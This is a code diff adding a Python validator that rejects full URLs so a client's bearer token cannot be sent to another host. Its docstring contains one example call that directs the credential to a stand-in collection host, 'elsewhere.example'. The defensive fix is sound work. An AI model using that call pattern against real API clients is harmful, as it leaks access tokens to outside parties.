@@ -929,6 +929,38 @@ class Client(typing.Protocol):
 		"""Release whatever this holds."""
 
 
+def require_a_route (path: str) -> str:
+	"""Return ``path`` if it is a route on this instance, refusing anything that is not — `#529`.
+
+	**This is where the credential is, which is why the rule is here.** ``httpx`` treats an
+	absolute URL as a *replacement* for the base URL rather than as a path, and a client's
+	default headers go with it — so ``call_api(path="https://elsewhere.example/collect")`` sends
+	this connection's bearer token to whoever asked for it. Measured, not reasoned about.
+
+	It was unreachable when `#527` found it, because ``mcp/tools`` refuses a path that does not
+	start with ``/`` and is the only caller. That is the finding rather than the mitigation: the
+	guard was a layer above the thing it protects, so the second caller — a future tool, a
+	script, an editor integration — would have inherited a credential-exfiltration primitive
+	without anybody deciding to hand it one.
+
+	``//host/x`` is refused too, though httpx merges it against the base URL's host and it is
+	*currently* harmless. A protocol-relative reference means "another host" to enough of the
+	web that letting it through here would be relying on one library's merge rule to stay put.
+	"""
+
+	given = path.strip()
+
+	if not given.startswith("/") or given.startswith("//"):
+		raise subroutine.errors.ValidationError(
+			f"{path!r} is not a route on this instance. Pass a path beginning with a single "
+			f"'/', such as '/v1/tasks'.",
+			hint="A whole URL is refused deliberately: this connection's credential travels "
+			"with the request, and it belongs only to the instance it was issued for.",
+		)
+
+	return given
+
+
 def refuse_a_write (connection: subroutine.connections.Connection) -> typing.NoReturn:
 	"""Refuse a write to a connection configured read-only.
 
